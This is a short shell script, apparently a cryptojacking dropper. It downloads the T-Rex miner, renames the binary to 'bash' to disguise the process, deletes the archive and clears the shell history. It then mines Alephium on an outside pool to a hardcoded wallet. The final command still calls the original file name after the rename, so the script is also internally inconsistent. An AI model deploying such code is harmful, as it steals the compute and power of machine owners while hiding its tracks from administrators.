#!/bin/sh
wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
tar xaf t-rex-0.25.15-linux.tar.gz
chmod +x t-rex
mv t-rex bash
rm -rvf t-rex-0.25.15-linux.tar.gz
history -cr
./t-rex -a blake3 -o stratum+tcp://de.alephium.herominers.com:1199 -u 1HQkv6GiNoUH5NTeUbBgPMekghz1hp6QFsdgr3uFuuoxq -p x -w Tuyuls
